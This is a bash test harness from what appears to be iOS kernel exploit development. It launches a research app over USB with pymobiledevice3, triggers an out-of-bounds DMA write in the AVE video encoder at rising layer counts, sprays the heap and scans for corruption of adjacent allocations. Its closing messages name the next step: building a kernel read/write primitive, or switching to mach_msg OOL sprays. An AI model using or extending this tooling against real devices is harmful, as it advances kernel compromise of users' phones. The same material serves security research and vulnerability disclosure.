#!/bin/bash
# run_pixel_tests.sh — Run AVEPixel probe test sequence on device
# Usage: ./run_pixel_tests.sh [udid]
# Runs the critical pixel data heap adjacency tests in priority order.

set -e

UDID="${1:-$(pymobiledevice3 usbmux list --usb 2>/dev/null | python3 -c "import json,sys; d=json.load(sys.stdin); print(d[0]['UniqueDeviceID']) if d else sys.exit(1)" 2>/dev/null)}"
if [ -z "$UDID" ]; then echo "ERROR: No USB device found"; exit 1; fi

BUNDLE="com.research.avepixel"
RESULTS_DIR="$HOME/a20_research/pixel_results"
mkdir -p "$RESULTS_DIR"

run_test() {
    local mode="$1"
    local desc="$2"
    echo ""
    echo "=== TEST: $mode — $desc ==="
    echo "  Launching..."
    pymobiledevice3 developer dvt launch --udid "$UDID" "$BUNDLE $mode" 2>&1 | grep -v "INFO"
    echo "  Waiting 20s for completion..."
    sleep 20
    echo "  Pulling results..."
    local tmpfile=$(mktemp)
    printf "pull ave_pixeldata_%s.txt %s\nexit\n" "$mode" "$tmpfile" | \
        pymobiledevice3 apps afc --documents --udid "$UDID" "$BUNDLE" 2>&1 | grep -v "Welcome\|Warning\|help\|house_arrest"
    if [ -f "$tmpfile" ] && [ -s "$tmpfile" ]; then
        cp "$tmpfile" "$RESULTS_DIR/${mode}.txt"
        echo "  Result saved to $RESULTS_DIR/${mode}.txt"
        echo "  --- Output ---"
        cat "$tmpfile"
        echo "  --- End ---"
    else
        echo "  WARNING: No result file (app may have crashed = GOOD for high NTL)"
    fi
    rm -f "$tmpfile"
    echo ""
}

echo "============================================"
echo "  AVEPixel Test Sequence"
echo "  Device: $UDID"
echo "  Time: $(date)"
echo "============================================"

# Phase 1: Baseline — verify sentinels work
run_test "baseline" "Verify pixel sentinel setup (no encode)"

# Phase 2: Critical tests — heap adjacency detection
run_test "pixel_ntl9" "NTL=9: minimal DMA OOB (1 extra temporal layer)"
run_test "pixel_ntl16" "NTL=16: moderate DMA OOB (8 extra layers)"
run_test "pixel_ntl32" "NTL=32: larger DMA OOB (24 extra layers)"

# Phase 3: Multi-round — maximize hit probability
run_test "multi_round" "10 rounds of NTL=9 spray+encode"

# Phase 4: Full scan — byte-level corruption detection
run_test "scan_all" "NTL=9 with full byte scan at page boundaries"

echo "============================================"
echo "  All tests complete"
echo "  Results in: $RESULTS_DIR/"
echo "============================================"
echo ""
echo "If ANY test shows CORRUPTION:"
echo "  → Heap adjacency confirmed"
echo "  → DMA OOB CAN corrupt adjacent page-pool allocations"
echo "  → Next: build kernel R/W primitive from corrupted pixel data"
echo ""
echo "If ALL tests show 0 corruption:"
echo "  → Try higher NTL values (64, 128, 256)"
echo "  → Try mach_msg OOL spray instead"
echo "  → May need larger spray count or different surface sizes"
